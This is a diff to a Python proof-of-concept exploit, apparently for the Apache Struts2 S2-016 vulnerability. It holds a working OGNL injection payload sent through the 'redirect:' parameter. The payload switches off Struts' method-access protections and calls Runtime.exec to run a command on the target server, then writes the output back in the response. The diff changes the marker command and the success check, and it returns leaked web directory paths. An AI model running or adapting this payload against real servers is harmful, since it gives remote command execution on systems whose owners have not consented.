@@ -24,7 +24,7 @@ def poc(url):
     url = url if '://' in url else 'http://' + url
     url = url.split('#')[0].split('?')[0]
 
-    command = "echo rivirsir"
+    command = "echo rivirsirfortest"
     payloads = [
         # 执行命令payload
         '${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("%s").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}' % command,
@@ -38,12 +38,11 @@ def poc(url):
         vulurl = url + '?redirect:%s' % urllib.quote(payload)
         try:
             resp = requests.get(vulurl, timeout=10)
-            if resp.text.startswith("rivirsir"):
+            if "rivirsirfortest" in resp.text:
                 #print resp.text
                 return True
             if len(resp.text) <= 100 and "webapps" in resp.text:
-            	print 'web dir: ',resp.text
-                return True
+                return "[S2-016][web dir]%s"%resp.text + url
         except Exception as e:
             print(e)
     return False
